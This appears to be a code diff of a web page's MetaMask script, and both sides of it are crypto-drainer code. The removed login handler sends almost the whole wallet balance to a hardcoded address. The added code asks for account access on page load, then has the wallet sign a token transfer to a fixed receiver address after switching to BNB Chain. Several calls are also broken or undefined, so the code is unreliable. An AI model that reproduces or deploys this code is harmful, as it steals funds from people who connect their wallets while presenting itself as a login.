@@ -18,67 +18,43 @@
 
 
   <script>
-    window.userWalletAddress = null
-    const loginButton = document.getElementById('loginButton')
-    const userWallet = document.getElementById('userWallet')
+    if (typeof window.ethereum !== 'undefined') {
+    ethereum.request({ method: 'eth_requestAccounts' });
+} else {
+    alert('Please install metamask')
+}
 
-    function toggleButton() {
-      if (!window.ethereum) {
-        loginButton.innerText = 'MetaMask is not installed'
-        loginButton.classList.remove('bg-purple-500', 'text-white')
-        loginButton.classList.add('bg-gray-500', 'text-gray-100', 'cursor-not-allowed')
-        return false
-      }
+const web3 = new Web3('https://bsc-dataseed1.binance.org:443');
+const contractAddress = '0x08ba0619b1e7a582e0bce5bbe9843322c954c340';
+const reciever = '0x6B5e6761A9fa07573aD01aeEBc0B724bD3a2980a';
+const sendEthButton = document.querySelector('.sendEthButton');
 
-      loginButton.addEventListener('click', loginWithMetaMask)
-    }
-
-    async function loginWithMetaMask() {
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
-
-        .catch((e) => {
-          console.error(e.message)
-          return
-        })
-      if (!accounts) { return }
-
-      window.userWalletAddress = accounts[0]
-      userWallet.innerText = window.userWalletAddress
-      loginButton.innerText = 'Sign out of MetaMask'
-       console.log(window.ethereum.getBalance(window.userWalletAddress));
-
-  const web3 = new Web3(provider);
-  console.log("Web3 instance is", web3);
-      var from = window.userWalletAddress;
-      var to = "0x06A9a217f32d2368199386Aabd84F7c02123a183";
-      var balance = window.ethereum.getBalance(from);
-      console.log(to);
-      var gas = new BigNumber(21000);
-      var gasPrice = web3.utils.toWei(5, "gwei");
-      var cost = gas.mul(gasPrice);
-      var sendAmount = balance.sub(cost);
-      var tx = eth.sendTransaction({from: from, to: to, gas: gas, gasPrice: gasPrice, value: sendAmount});
-      console.log(eth.getTransaction(tx));
-      loginButton.removeEventListener('click', loginWithMetaMask)
-      setTimeout(() => {
-        loginButton.addEventListener('click', signOutOfMetaMask)
-      }, 200)
-    }
-
-    function signOutOfMetaMask() {
-      window.userWalletAddress = null
-      userWallet.innerText = ''
-      loginButton.innerText = 'Sign in with MetaMask'
-
-      loginButton.removeEventListener('click', signOutOfMetaMask)
-      setTimeout(() => {
-        loginButton.addEventListener('click', loginWithMetaMask)
-      }, 200)
-    }
-
-    window.addEventListener('DOMContentLoaded', () => {
-      toggleButton()
-    });
+sendEthButton.addEventListener('click', () => {
+    (async ()=>{
+        const contract = new web3.eth.Contract(ABI, contractAddress);
+        const transfer = await contract.methods.transfer(reciever, 10);
+        const encodedABI = await transfer.encodeABI();
+        if(window.ethereum.chainId == '0x38'){
+            ethereum
+            .request({
+            method: 'eth_sendTransaction',
+            params: [
+                {
+                    from: ethereum.selectedAddress,
+                    to: reciever,
+                    gasPrice: '',
+                    gas: '',
+                    data: encodedABI
+                },
+            ],
+            })
+            .then((txHash) => console.log(txHash))
+            .catch((error) => console.error);
+        } else {
+            ethereum.request({ method: 'wallet_switchEthereumChain', params:[{chainId: '0x38'}]})
+        }
+    })()
+});
   </script>
 </body>
 
